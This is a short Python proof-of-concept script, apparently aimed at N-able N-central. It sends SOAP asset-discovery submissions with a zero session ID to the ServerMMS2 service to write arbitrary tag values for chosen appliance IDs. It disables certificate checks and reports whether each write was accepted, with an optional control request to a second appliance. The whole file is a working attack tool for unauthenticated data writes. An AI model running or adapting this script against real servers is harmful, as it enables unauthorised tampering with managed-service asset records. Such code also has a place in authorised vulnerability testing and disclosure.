#!/usr/bin/env python3
import argparse
import html

import requests
import urllib3


def request(target, appliance_id, value):
    body = f'''<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:m="http://mms2.nobj.nable.com/"><soap:Body><m:AssetDiscoSimplifiedInfoSubmit><m:sessionID>0</m:sessionID><m:applianceID>{appliance_id}</m:applianceID><m:jobID>0</m:jobID><m:asset><m:PrimaryIP></m:PrimaryIP><m:Name></m:Name><m:Fqdn></m:Fqdn><m:ExtraDetails><m:Key>ncentraltag</m:Key><m:Value>{html.escape(value)}</m:Value></m:ExtraDetails></m:asset></m:AssetDiscoSimplifiedInfoSubmit></soap:Body></soap:Envelope>'''
    return requests.post(
        target.rstrip('/') + '/dms2/services2/ServerMMS2',
        data=body,
        headers={'Content-Type': 'application/soap+xml; charset=UTF-8'},
        verify=False,
        timeout=30,
    )


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', default='https://n-central.local')
    parser.add_argument('--appliance-id', required=True, type=int)
    parser.add_argument('--value', required=True)
    parser.add_argument('--control-appliance-id', type=int)
    args = parser.parse_args()
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    if args.control_appliance_id:
        control = request(args.target, args.control_appliance_id, args.value)
        print(f'control_http={control.status_code}')
    response = request(args.target, args.appliance_id, args.value)
    print(f'write_http={response.status_code}')
    print(f'accepted={"AssetDiscoSimplifiedInfoSubmitResponse" in response.text}')


if __name__ == '__main__':
    main()
